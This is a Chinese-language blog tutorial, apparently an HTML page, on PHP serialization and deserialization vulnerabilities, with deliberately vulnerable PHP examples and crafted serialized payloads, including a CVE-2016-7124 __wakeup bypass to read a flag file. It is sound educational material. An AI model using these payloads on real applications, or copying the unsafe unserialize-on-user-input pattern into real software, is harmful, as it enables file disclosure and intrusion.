@@ -1,0 +1,320 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PHP:序列化与反序列化 - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="PHP序列化：serialize序列化是将变量或对象转换成字符串的过程。举例：
+&amp;lt;?php
+class man{
+ public $name;
+ public $age;
+ public $h,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">PHP:序列化与反序列化</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">PHP:序列化与反序列化</h1>
+        <div class="stuff">
+            <span>三月 18, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="PHP序列化：serialize"><a href="#PHP序列化：serialize" class="headerlink" title="PHP序列化：serialize"></a>PHP序列化：serialize</h2><p>序列化是将变量或对象转换成字符串的过程。<br>举例：</p>
+<pre><code>&lt;?php
+class man{
+ public $name;
+ public $age;
+ public $height;
+
+ function __construct($name,$age,$height){        //_construct：创建对象时初始化
+  $this-&gt;name = $name;
+  $this-&gt;age = $age;
+  $this-&gt;height = $height;
+ }
+
+}
+
+$man=new man("Bob",5,20);
+var_dump(serialize($man));
+
+?&gt;</code></pre>
+<p>输出：</p>
+<pre><code>string(67) "O:3:"man":3:{s:4:"name";s:3:"Bob";s:3:"age";i:5;s:6:"height";i:20;}"</code></pre>
+<h3 id="解释一下输出结果："><a href="#解释一下输出结果：" class="headerlink" title="解释一下输出结果："></a>解释一下输出结果：</h3><h5 id="O-代表obeject-A-代表数组"><a href="#O-代表obeject-A-代表数组" class="headerlink" title="O:代表obeject/A:代表数组"></a>O:代表obeject/A:代表数组</h5><h5 id="3-代表对象名占三个字符"><a href="#3-代表对象名占三个字符" class="headerlink" title="3:代表对象名占三个字符"></a>3:代表对象名占三个字符</h5><h5 id="第二个3-代表对象里有三个变量"><a href="#第二个3-代表对象里有三个变量" class="headerlink" title="第二个3:代表对象里有三个变量"></a>第二个3:代表对象里有三个变量</h5><h5 id="S-数据类型-s-string-i-int"><a href="#S-数据类型-s-string-i-int" class="headerlink" title="S:数据类型 s:string/i:int"></a>S:数据类型 s:string/i:int</h5><h5 id="4-代表变量名的字符长度"><a href="#4-代表变量名的字符长度" class="headerlink" title="4:代表变量名的字符长度"></a>4:代表变量名的字符长度</h5><pre><code>Object(O)： O:&lt;class_name_length&gt;:"&lt;class_name&gt;":&lt;number_of_properties&gt;:{&lt;properties&gt;}
+Boolean（b）: b:value;(0或1)
+double（d）
+integer（i）: i:value;
+array（a）： a:&lt;length&gt;:{key,keyvalue}
+string（s）: s:&lt;length&gt;:value;
+null（N）</code></pre>
+<h2 id="PHP反序列化：unserialize"><a href="#PHP反序列化：unserialize" class="headerlink" title="PHP反序列化：unserialize"></a>PHP反序列化：unserialize</h2><p>反序列化是将字符串转换成变量或对象的过程。<br>举例：</p>
+<pre><code>&lt;?php
+class man{
+ public $name;
+ public $age;
+ public $height;
+
+ function __construct($name,$age,$height){
+  $this-&gt;name = $name;
+  $this-&gt;age = $age;
+  $this-&gt;height = $height;
+ }
+
+}
+
+$man= 'O:3:"man":3:{s:4:"name";s:3:"Bob";s:3:"age";i:5;s:6:"height";i:20;}';
+var_dump(unserialize($man));
+
+?&gt;</code></pre>
+<p>输出：</p>
+<pre><code>object(man)#1 (3) {
+  ["name"]=&gt;
+  string(3) "Bob"
+  ["age"]=&gt;
+  int(5)
+  ["height"]=&gt;
+  int(20)
+}</code></pre>
+<h2 id="反序列化漏洞："><a href="#反序列化漏洞：" class="headerlink" title="反序列化漏洞："></a>反序列化漏洞：</h2><h4 id="两个条件："><a href="#两个条件：" class="headerlink" title="两个条件："></a><strong>两个条件：</strong></h4><ol>
+<li><p>unserialize()函数的参数可控</p>
+</li>
+<li><p>php中有可以利用的类并且类中有魔幻函数</p>
+<p>魔幻函数一般是以__开头，通常会因为某些条件而触发不用我们手动调用：</p>
+</li>
+</ol>
+<h4 id="魔幻函数："><a href="#魔幻函数：" class="headerlink" title="魔幻函数："></a><strong>魔幻函数：</strong></h4><pre><code>_construct()：创建对象时初始化/当一个对象创建时被调用
+_destruction()：结束时销毁对象/当一个对象销毁时被调用
+_toString()：对象被当作字符串时使用/当一个对象被当作一个字符串使用
+_sleep()：序列化对象之前调用/在对象在被序列化之前运行
+_wakeup()：反序列化之前调用/将在序列化之后立即被调用
+_call()：调用对象不存在时使用
+_get()：调用私有属性时使用</code></pre>
+<h3 id="例一："><a href="#例一：" class="headerlink" title="例一："></a>例一：</h3><pre><code>&lt;?php
+class A{
+    var $test = "demo";
+    function __destruct(){
+            echo $this-&gt;test;
+    }
+}
+$a = $_GET['test'];
+$a_unser = unserialize($a);
+?&gt;</code></pre>
+<p>这里我们只要构造payload：</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/test.php?test=O:1:">http://127.0.0.1/test.php?test=O:1:”A”:1:{s:4:”test”;s:5:”hello”;}</a></p>
+<p>就能控制echo出的变量，比如你能拿这个来进行反射型xss。。。</p>
+<h3 id="例二："><a href="#例二：" class="headerlink" title="例二："></a>例二：</h3><p>index.php</p>
+<pre><code>&lt;?php
+class SoFun{
+  public $file='index.php';
+
+  function __destruct(){
+    if(!empty($this-&gt;file)){
+      if(strchr($this-&gt; file,"\\")===false &amp;&amp;  strchr($this-&gt;file, '/')===false){
+        echo "&lt;br&gt;";
+        show_source(dirname (__FILE__).'/'.$this -&gt;file);}
+      else
+        die('Wrong filename.');
+      }
+    }
+
+  function __wakeup(){ 
+    $this-&gt; file='index.php'; 
+    }  
+
+  public function __toString(){return '' ;}}
+
+  if (!isset($_GET['file'])){
+    show_source('index.php');
+  } 
+  else
+  { 
+    $file = $_GET['file']; 
+    echo unserialize($file); 
+  } 
+?&gt;  &lt;!--key in flag.php--&gt;</code></pre>
+<p>flag.php</p>
+<pre><code>&lt;?php
+echo "key{you got it!!}"
+?&gt;</code></pre>
+<p>代码审计：</p>
+<p>1.代码最后提示key在flag.php里，因此我们要想办法读里面的内容。<br>2.在__destruct()魔术方法中，show_source(dirname (<strong>FILE</strong>).’/‘.$this -&gt;file)这里是解题的关键，在反序列化之后会自动调用__destruct方法，可以利用这个将flag.php的内容读出来。<br>3.在__wakeup()魔术方法中，在反序列化后会自动调用__wakeup方法并将file的值置为index.php。<br>4.我们要想读出flag.php里的内容需要调用__destruct方法而绕过__wakeup方法。</p>
+<p>这里要用到CVE-2016-7124漏洞：当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p>
+<h5 id="构造序列化对象：O-5-”SoFun”-1-s-4-”file”-s-8-”flag-php”"><a href="#构造序列化对象：O-5-”SoFun”-1-s-4-”file”-s-8-”flag-php”" class="headerlink" title="构造序列化对象：O:5:”SoFun”:1:{s:4:”file”;s:8:”flag.php”;}"></a>构造序列化对象：O:5:”SoFun”:1:{s:4:”file”;s:8:”flag.php”;}</h5><h5 id="构造绕过-wakeup：O-5-”SoFun”-2-s-4-”file”-s-8-”flag-php”"><a href="#构造绕过-wakeup：O-5-”SoFun”-2-s-4-”file”-s-8-”flag-php”" class="headerlink" title="构造绕过__wakeup：O:5:”SoFun”:2:{s:4:”file”;s:8:”flag.php”;}"></a>构造绕过__wakeup：O:5:”SoFun”:2:{s:4:”file”;s:8:”flag.php”;}</h5><h3 id="例三："><a href="#例三：" class="headerlink" title="例三："></a>例三：</h3><pre><code>&lt;?php 
+    require_once('shield.php');
+    $x = new Shield();
+    isset($_GET['class']) &amp;&amp; $g = $_GET['class'];
+    if (!empty($g)) {
+        $x = unserialize($g);
+    }
+    echo $x-&gt;readfile();
+?&gt;</code></pre>
+<p>可以看见 先是包含了shield.php 然后从中new了个新的实例出来 最后接收用户的反序列化 输出readfile()方法</p>
+<p>跟进：</p>
+<pre><code>&lt;?php
+    //flag is in pctf.php
+    class Shield {
+        public $file;
+        function __construct($filename = '') {
+            $this -&gt; file = $filename;
+        }
+        function readfile() {
+            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE  
+            &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) {
+                return @file_get_contents($this-&gt;file);
+            }
+        }
+    }
+?&gt;</code></pre>
+<p>这里我们可以看见只要操控$file这个参数为pctf.php就可以了，这里construct函数在实例被创建的时候(也就是new Shield()的时候)执行，所以不会影响我们对$file的操作</p>
+<p>直接构造序列化对象传过去 O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;} 就行了</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/167721.html">https://www.freebuf.com/articles/web/167721.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44677409/article/details/93884388">https://blog.csdn.net/weixin_44677409/article/details/93884388</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9Aserialize"><span class="toc-number">1.</span> <span class="toc-text">PHP序列化：serialize</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A%E4%B8%80%E4%B8%8B%E8%BE%93%E5%87%BA%E7%BB%93%E6%9E%9C%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">解释一下输出结果：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#O-%E4%BB%A3%E8%A1%A8obeject-A-%E4%BB%A3%E8%A1%A8%E6%95%B0%E7%BB%84"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">O:代表obeject&#x2F;A:代表数组</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E4%BB%A3%E8%A1%A8%E5%AF%B9%E8%B1%A1%E5%90%8D%E5%8D%A0%E4%B8%89%E4%B8%AA%E5%AD%97%E7%AC%A6"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">3:代表对象名占三个字符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AA3-%E4%BB%A3%E8%A1%A8%E5%AF%B9%E8%B1%A1%E9%87%8C%E6%9C%89%E4%B8%89%E4%B8%AA%E5%8F%98%E9%87%8F"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">第二个3:代表对象里有三个变量</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#S-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B-s-string-i-int"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">S:数据类型 s:string&#x2F;i:int</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E4%BB%A3%E8%A1%A8%E5%8F%98%E9%87%8F%E5%90%8D%E7%9A%84%E5%AD%97%E7%AC%A6%E9%95%BF%E5%BA%A6"><span class="toc-number">1.1.0.5.</span> <span class="toc-text">4:代表变量名的字符长度</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9Aunserialize"><span class="toc-number">2.</span> <span class="toc-text">PHP反序列化：unserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">反序列化漏洞：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%A4%E4%B8%AA%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-number">3.0.1.</span> <span class="toc-text">两个条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AD%94%E5%B9%BB%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">3.0.2.</span> <span class="toc-text">魔幻函数：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E4%B8%80%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">例一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E4%BA%8C%EF%BC%9A"><span class="toc-number">3.2.</span> <span class="toc-text">例二：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%EF%BC%9AO-5-%E2%80%9DSoFun%E2%80%9D-1-s-4-%E2%80%9Dfile%E2%80%9D-s-8-%E2%80%9Dflag-php%E2%80%9D"><span class="toc-number">3.2.0.1.</span> <span class="toc-text">构造序列化对象：O:5:”SoFun”:1:{s:4:”file”;s:8:”flag.php”;}</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E7%BB%95%E8%BF%87-wakeup%EF%BC%9AO-5-%E2%80%9DSoFun%E2%80%9D-2-s-4-%E2%80%9Dfile%E2%80%9D-s-8-%E2%80%9Dflag-php%E2%80%9D"><span class="toc-number">3.2.0.2.</span> <span class="toc-text">构造绕过__wakeup：O:5:”SoFun”:2:{s:4:”file”;s:8:”flag.php”;}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E4%B8%89%EF%BC%9A"><span class="toc-number">3.3.</span> <span class="toc-text">例三：</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
